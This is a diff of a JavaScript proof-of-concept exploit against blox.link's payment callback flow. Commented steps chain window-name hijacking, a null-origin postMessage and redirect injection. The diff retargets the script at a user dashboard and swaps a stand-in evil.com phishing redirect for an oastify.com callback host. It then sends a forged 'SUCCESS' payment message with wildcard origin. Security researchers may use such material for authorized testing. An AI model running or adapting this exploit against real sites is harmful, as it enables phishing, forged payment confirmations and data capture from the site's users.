@@ -17,11 +17,11 @@
   let popup;
   
   // Attack 1: Window name hijacking
-  const hijackFrame = window.open('https://blox.link/404', 'cb-payment-callback');
+  const hijackFrame = window.open('https://blox.link/dashboard/user', 'cb-payment-callback');
   
   // Attack 2: Null origin postMessage
   setTimeout(() => {
-    popup = window.open('https://blox.link/checkout');
+    popup = window.open('https://blox.link/dashboard/user');
     
     setTimeout(() => {
       // Both windows have null origin now
@@ -37,7 +37,7 @@
       // Attack 3: Redirect injection
       popup.postMessage({
         key: 'SUCCESS',
-        redirectUrl: 'https://evil.com/phishing?stolen=true',
+        redirectUrl: 'https://uwui2uv36bur0nu5oxd97i6qyh48szgo.oastify.com/phishing?stolen=true',
         value: 'payment_success',
         data: { customerId: 'victim123' }
       }, '*');
